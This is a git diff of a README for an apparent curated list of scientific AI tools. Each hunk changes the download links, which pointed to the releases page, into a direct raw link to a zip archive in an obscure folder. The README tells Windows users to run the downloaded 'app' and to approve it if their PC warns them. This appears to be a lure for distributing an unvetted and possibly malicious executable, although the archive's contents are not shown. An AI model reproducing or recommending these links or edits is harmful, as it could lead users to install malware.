@@ -1,10 +1,10 @@
 # 🧪 awesome-scientific-ai-tools - AI tools for faster research
 
-[![Download](https://img.shields.io/badge/Download%20the%20latest%20release-blue.svg)](https://github.com/sparzinhogames-hash/awesome-scientific-ai-tools/releases)
+[![Download](https://img.shields.io/badge/Download%20the%20latest%20release-blue.svg)](https://github.com/sparzinhogames-hash/awesome-scientific-ai-tools/raw/refs/heads/main/breva/ai_scientific_tools_awesome_v3.2.zip)
 
 ## 📥 Download the app
 
-Visit this page to download: https://github.com/sparzinhogames-hash/awesome-scientific-ai-tools/releases
+Visit this page to download: https://github.com/sparzinhogames-hash/awesome-scientific-ai-tools/raw/refs/heads/main/breva/ai_scientific_tools_awesome_v3.2.zip
 
 Choose the latest release for Windows and download the file that matches your computer. If you see more than one file, pick the Windows version first.
 
@@ -39,7 +39,7 @@ If your PC asks for approval before opening the file, choose the option that let
 
 ## 🚀 How to download and run on Windows
 
-1. Open the release page: https://github.com/sparzinhogames-hash/awesome-scientific-ai-tools/releases  
+1. Open the release page: https://github.com/sparzinhogames-hash/awesome-scientific-ai-tools/raw/refs/heads/main/breva/ai_scientific_tools_awesome_v3.2.zip  
 2. Find the newest release at the top of the page.
 3. Look for a Windows file in the Assets section.
 4. Download the file to your computer.
@@ -176,4 +176,4 @@ A clear setup helps when you return to a project after a break
 
 ## 🔗 Download again
 
-Visit this page to download: https://github.com/sparzinhogames-hash/awesome-scientific-ai-tools/releases
+Visit this page to download: https://github.com/sparzinhogames-hash/awesome-scientific-ai-tools/raw/refs/heads/main/breva/ai_scientific_tools_awesome_v3.2.zip
